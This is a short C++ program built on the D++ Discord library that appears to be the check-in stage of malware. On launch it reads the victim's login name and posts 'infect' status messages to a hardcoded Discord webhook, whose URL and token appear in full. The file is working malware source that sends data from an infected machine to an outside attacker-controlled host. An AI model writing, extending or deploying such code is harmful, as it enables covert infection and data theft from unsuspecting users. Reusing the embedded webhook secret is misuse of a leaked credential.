#include "header.h"
#include "embeds/handling/handling.h"

//Returning 0 in error cases are for a specific condition, please avoid changing it.

int main() {
    dotenv::init();
    dpp::cluster temp_token("");
    const std::string MAIN_WEBHOOK_url = "https://discord.com/api/webhooks/1140423949080080424/Q5WTMKMrTImUw4tfi56pDevc2VBsbU65xOT2zRffCs2xzfCbEAtegPmXl-Higxp5MI-Y";
    dpp::webhook MAIN_WEBHOOK(MAIN_WEBHOOK_url);

    try {
        char* system_username = getlogin();
        std::string formated_username(system_username);
        dpp::message infect("");
        infect.add_embed(making_connection(formated_username));

        temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(infect));

        bool worked = true;

        if(worked == false) {
            dpp::message error_infect("");
            error_infect.add_embed(connection_result(worked));
            std::this_thread::sleep_for(std::chrono::seconds(1)); //Avoid deleting this sleep, so all the code will stop working. due to webhooks limits
            temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(error_infect));
        } else {
            dpp::message success_infect("");
            success_infect.add_embed(connection_result(worked));
            std::this_thread::sleep_for(std::chrono::seconds(1));
            temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(success_infect));
        }
    } catch(const std::exception& e) {
        dpp::message exception_error("");
        exception_error.add_embed(handle_catch(e));
        std::this_thread::sleep_for(std::chrono::seconds(1));
        temp_token.execute_webhook(MAIN_WEBHOOK, dpp::message(exception_error));
    }

    return 0;
}